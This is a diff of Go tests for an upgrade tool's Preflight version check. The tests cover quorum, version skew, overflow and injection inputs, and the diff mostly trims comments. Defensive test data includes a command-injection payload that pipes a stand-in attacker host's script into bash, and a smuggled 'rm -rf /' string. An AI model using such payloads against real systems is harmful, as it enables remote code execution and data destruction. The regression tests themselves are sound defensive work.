@@ -32,8 +32,7 @@ func TestPreflight(t *testing.T) {
 		{"minor skip rejected", "v1.38.0", cpNodes("v1.36.2", 3), false},
 		{"bad target rejected", "nope", cpNodes("v1.36.2", 3), false},
 		{"cp not quorum rejected", "v1.36.2", cpNodes("v1.35.6", 1), false},
-		// 2/3 is quorum, but not once the next Ready one is drained: the
-		// rollout can reach a Ready member first.
+		// 2/3 is quorum, but not once the next Ready one is drained.
 		{"cp 2/3 rejected: no margin to drain", "v1.36.2", cpNodes("v1.35.6", 2), false},
 		{"cp 2/3 at target rejected", "v1.36.2", cpNodes("v1.36.2", 2), false},
 		{"cp 4/5 ok: one down, one draining, 3 left", "v1.36.2", cpNodesOf(5, "v1.35.6", 4), true},
@@ -41,16 +40,12 @@ func TestPreflight(t *testing.T) {
 		{"single cp ok", "v1.36.2", cpNodesOf(1, "v1.35.6", 1), true},
 
 		// The target is user input and is held to exact vMAJOR.MINOR.PATCH.
-		// "1.36" and "v1.36.2+build" are rejected as TARGETS while staying valid
-		// as observed node versions
-		// (covered by TestPreflightKeepsGatesArmedOnSuffixedNodeVersions).
 		{"target without v rejected", "1.36.2", cpNodes("v1.35.6", 3), false},
 		{"target without patch rejected", "v1.36", cpNodes("v1.35.6", 3), false},
 		{"target with build metadata rejected", "v1.36.2+build", cpNodes("v1.35.6", 3), false},
 		{"target with leading zero rejected", "v01.36.2", cpNodes("v1.35.6", 3), false},
 
-		// Cross-major: major/minor comparison alone accepts both of these as
-		// "minor 36" and drives a real rollout against a v1.35 cluster.
+		// Cross-major: a major/minor comparison alone would accept both as "minor 36".
 		{"cross-major up rejected", "v99.36.2", cpNodes("v1.35.6", 3), false},
 		{"cross-major down rejected", "v0.36.2", cpNodes("v1.35.6", 3), false},
 		{"cross-major adjacent rejected", "v2.0.0", cpNodes("v1.35.6", 3), false},
@@ -65,8 +60,6 @@ func TestPreflight(t *testing.T) {
 	}
 }
 
-// A build-suffixed target is refused with the version to use instead, the same
-// advice the per-node path gives (TestTargetMismatchSaysWhatToDo).
 func TestPreflightSuffixedTargetNamesBareVersion(t *testing.T) {
 	for target, want := range map[string]string{
 		"v1.37.1-stratum.0-rc.3": "use --target v1.37.1, not \"v1.37.1-stratum.0-rc.3\"",
@@ -82,9 +75,6 @@ func TestPreflightSuffixedTargetNamesBareVersion(t *testing.T) {
 	}
 }
 
-// TestPreflightRejectsInjectionTargets is the CVE-class case: every payload
-// here passed preflight before the split and reached a node annotation, and on
-// the CLI path a shell.
 func TestPreflightRejectsInjectionTargets(t *testing.T) {
 	for _, target := range []string{
 		"v1.36.2; curl http://attacker/x | bash",
@@ -101,11 +91,7 @@ func TestPreflightRejectsInjectionTargets(t *testing.T) {
 	}
 }
 
-// TestPreflightKeepsGatesArmedOnSuffixedNodeVersions is the fail-open
-// regression guard. Distribution-suffixed kubelet versions must still parse; if
-// they stop, no node version parses, Preflight's `seen` stays false, and it
-// silently skips BOTH the downgrade and the minor-skip check instead of
-// rejecting anything.
+// If suffixed node versions stop parsing, no node parses and the gates are skipped silently.
 func TestPreflightKeepsGatesArmedOnSuffixedNodeVersions(t *testing.T) {
 	for _, nodeVer := range []string{
 		"v1.36.2+build",
@@ -126,8 +112,7 @@ func TestPreflightKeepsGatesArmedOnSuffixedNodeVersions(t *testing.T) {
 	}
 }
 
-// A rejected target is echoed into user-facing text; it must not be able to
-// smuggle raw control characters into a log line or a CR status message.
+// A rejected target is echoed into user-facing text; it must not carry raw control characters.
 func TestPreflightQuotesRejectedTarget(t *testing.T) {
 	reason := Preflight("v1.36.2\nrm -rf /", cpNodes("v1.35.6", 3))
 	if reason == "" {
@@ -140,10 +125,7 @@ func TestPreflightQuotesRejectedTarget(t *testing.T) {
 	}
 }
 
-// The lagging node, not the cluster maximum, must bound the skew and
-// cross-major gates. `stratum upgrade --cluster` halts on the first node failure
-// ("halting; later nodes untouched"), so a mixed cluster is the normal state
-// after a failed rollout — and the next attempt is preflighted against it.
+// A mixed cluster is the normal state after a halted rollout, which the next attempt preflights.
 func TestPreflightUsesTheLaggingNodeForSkewAndMajor(t *testing.T) {
 	mixed := func(vers ...string) []Node {
 		var ns []Node
@@ -177,15 +159,13 @@ func TestPreflightUsesTheLaggingNodeForSkewAndMajor(t *testing.T) {
 	}
 }
 
-// A component can satisfy the target pattern and still overflow an int; the
-// parsed numbers must not be trusted when that happens.
+// A component can satisfy the target pattern and still overflow an int.
 func TestPreflightRejectsOverflowingTarget(t *testing.T) {
 	for _, target := range []string{"v99999999999999999999.36.2", "v1.99999999999999999999.2"} {
 		if reason := Preflight(target, cpNodes("v1.35.6", 3)); reason == "" {
 			t.Errorf("Preflight(%q) accepted an overflowing target", target)
 		}
-		// The dangerous case: no node version parses, so the gates are skipped
-		// and only the target check stands between this and the node argv.
+		// No node version parses here, so only the target check stands.
 		if reason := Preflight(target, cpNodes("unparseable", 3)); reason == "" {
 			t.Errorf("Preflight(%q) with no parseable node versions accepted an overflowing target", target)
 		}
